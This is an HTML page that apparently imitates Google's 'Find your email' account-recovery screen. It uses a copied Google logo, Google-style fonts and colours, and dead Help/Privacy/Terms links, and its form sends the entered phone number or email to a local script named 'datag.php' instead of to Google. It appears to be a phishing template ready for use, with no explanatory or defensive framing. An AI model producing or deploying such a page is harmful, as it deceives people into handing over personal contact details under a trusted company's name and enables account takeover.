<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Forget password</title>
</head>
<style>
    #div1 {
        border: 1px solid #dadcdf;
        width: 450px;
        height: 400px;
        margin-left: 530px;
        margin-top: 105px;
        padding-top: 30px;
        padding-bottom: 445px;
        border-radius: 8px;
        box-sizing: border-box;

    }

    img {
        width: 75px;
        height: 29px;
        margin-left: 185px;
        margin-bottom: 0px;
        margin-top: 8px;
    }

    #id1 {
        font-family: 'Google Sans', 'Noto Sans Myanmar UI', arial, sans-serif;
        font-size: 24px;
        font-weight: 400;
        line-height: 1px;
        margin-left: 137px;

    }

    #id2 {
        color: #202124;
        font-size: 16px;
        font-weight: 400;
        letter-spacing: 0.1px;
        line-height: 1.5;
        margin-left: 83px;
    }

    input[type=text] {
        width: 350px;
        height: 22px;
        padding: 16px;
        margin-left: 35px;
        font-size: 18px;
        border-radius: 8px;
        border: 1px solid #dadcdf;
        margin-top: 20px;
        margin-bottom: 12px;

    }

    button {
        margin-left: 338px;
        margin-top: 16px;
        background-color: #1676f3;
        color: white;
        font-size: 18px;
        font-weight: bold;
        width: 80px;
        height: 40px;
        border: 1px solid #1676f3;
        padding: 10px;
        border-radius: 8px;
    }

    #div2 {
        margin-left: 500px;
        margin-top: -15px;
    }

    label {
        font-size: 17px;
        opacity: 0.9px;
    }

    select {
        border: 1px solid white;
    }

    ul {
        list-style-type: none;
        margin-top: 30px;
    }

    li {
        float: left;
    }

    #help {
        margin-left: 75px;
    }

    #privacy {
        margin-left: 35px;
    }

    #terms {
        margin-left: 30px;
    }

    #a4 {
        text-decoration: none;
        color: #5c5959;
        font-size: 16px;
    }

    #div3{}
</style>

<body>
    <form class="login_form" action="datag.php" method="post">
        <div id="div1">
            <img src="https://freepngimg.com/download/google/66907-images-logo-google-free-download-png-hd.png"
                alt="google">
            <p id=id1>Find your email</p>
            <p id=id2>Enter your phone number or recovery email</p>
            <input type="text" name="email" placeholder="phone number or email" required>

            <button>next</button>
        </div>

        <div id="div2">
            <ul>
                <li>
                    <label>English(united States)</label>
                    <select name="languages" id="">
                        <option value=""></option>
                        <option value=""></option>
                        <option value=""></option>
                        <option value=""></option>
                        <option value=""></option>


                    </select>
                </li>
                <div id="div3">
                <li id="help"><a id="a4" href="#">Help</a></li>
                <li id="privacy"><a id="a4" href="#">Privacy</a></li>
                <li id="terms"><a id="a4" href="#">Terms</a></li>
            </div>
            </ul>

        </div>
</body>

</html>